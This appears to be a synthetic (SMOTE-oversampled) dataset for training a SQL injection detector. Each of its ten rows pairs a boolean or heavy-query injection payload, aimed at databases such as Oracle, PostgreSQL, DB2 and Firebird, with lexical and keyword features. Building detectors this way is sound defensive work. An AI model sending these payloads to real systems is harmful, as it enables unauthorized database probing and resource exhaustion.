id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,boolean,"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",nearest_attack_euclidean,R000103,0.3529486506493378,146.43825065513772,30.703187554594813,4.141031858951723,82.92231288216368,8.70318755459481,39.406375109189625,15.406375109189621,0.5662365037023113,0.05939777184990251,0.26924764445279875,0.10511807999498743,1.0,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,5.0,0.0,-1.1102230246251565e-16,2.703187554594811,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000002,attack,boolean,"1'||  (  select 'zifu' from dual where 4822  =  4822 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000159,1.3928161697976793,169.68886907302607,34.622261853947876,4.212106264731791,82.82208351118246,18.0,44.244523707895745,24.622261853947872,0.4880334258856178,0.10607728356023427,0.2607708896694102,0.14511840088473765,3.311130926973936,0.0,1.3777381460521276,-1.3877787807814457e-17,1.0,2.0,0.0,5.311130926973936,0.0,5.0,4.0,7.0,1.0,0.0,0.6888690730260638,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,2.0,0.0,1.0,1.6888690730260638,0.3111309269739362,0.6888690730260638,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.688869073026064
SMOTE_000003,attack,boolean,"1""   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""lynw"" like ""lynw",nearest_attack_euclidean,R000386,0.3318586886486971,143.0658136611078,32.0,3.519500904490408,46.0,13.0,64.55484471758983,19.510968943517966,0.3226461133836201,0.09118259726058828,0.44989882177598767,0.1362724675798039,0.0,4.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,11.510968943517966,0.0,1.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000004,attack,boolean,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000584,0.6304510107366429,72.59845993204854,19.31439571913939,3.0296313201806635,9.0,13.0,36.22725137032732,14.37120856172122,0.12504923945816596,0.18062667921735084,0.49588949870815546,0.19843458261632774,0.0,4.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,5.37120856172122,1.9999999999999998,-1.1102230246251565e-16,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000005,attack,boolean,"1  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000321,0.0609941532547361,129.0,29.0,3.9444685454928594,71.57589704435297,8.0,35.36351681912602,14.060586136521003,0.5548519150725036,0.06201550387596899,0.27413578929555055,0.10899679175597678,0.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,5.060586136521004,0.0,-1.1102230246251565e-16,2.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000006,attack,boolean,"1'  )   where 7646  =  7646 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000166,0.2791957845851322,141.3836540187146,34.03019241122877,4.247396097450975,70.0,16.0,39.70692321497169,15.676730803742922,0.49524395554322376,0.11319861840987971,0.28070133804467684,0.11085608800221972,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,4.676730803742921,0.0,-1.1102230246251565e-16,2.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000007,attack,boolean,"1%""   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000246,0.4171908194791335,142.84062499389202,30.420312496946007,3.8920185028320713,71.0,8.210156248473002,45.420312496946,18.210156248473,0.4971211472811917,0.05745307675728489,0.31795563620688755,0.12747013975463584,0.0,1.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,7.0,0.7898437515269974,-1.1102230246251565e-16,2.2101562484730026,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000008,attack,boolean,"1'+  (  select 'epza' where 8994  =  8994 and make_set  (  3782  =  2428,2428   )    )   +'",nearest_attack_euclidean,R000498,0.6894867255596888,88.25773021654703,29.451546043309406,3.8737131792109034,23.080411151582926,21.0,30.451546043309406,13.725773021654703,0.2603275212834582,0.2385819651950227,0.34542138830934715,0.15566912521217197,4.0,0.0,0.0,-1.3877787807814457e-17,0.2742269783452965,2.0,0.0,4.0,0.0,0.7257730216547035,0.7257730216547036,4.274226978345297,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000009,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,nearest_attack_euclidean,R000394,12.80382987636462,105.27010631262068,26.402924554563008,3.5963180971765683,34.61169821825203,14.0,40.456945817087146,16.201462277281504,0.30936262144147186,0.14320189862803184,0.38729925609260674,0.16013622383788959,0.0,1.6510967079611283,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,7.751827846601881,0.0,1.0,3.449634430679624,1.0,0.0,0.5503655693203761,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.4496344306796239,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.449634430679624
SMOTE_000010,attack,boolean,"1'+  (  select 'vfkl' where 1713  =  1713 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",nearest_attack_euclidean,R000345,0.9526775942564302,161.7991524557027,35.0,4.253211711170624,80.0,16.0,46.11355924774517,19.685593207957528,0.49464299376820664,0.09892859875364132,0.28477025006821804,0.12165815740993399,3.685593207957528,0.0,0.6288135840849436,-1.3877787807814457e-17,1.0,2.0,0.0,5.685593207957528,0.0,-1.1102230246251565e-16,2.0,5.314406792042472,1.0,0.0,0.3144067920424718,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,2.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
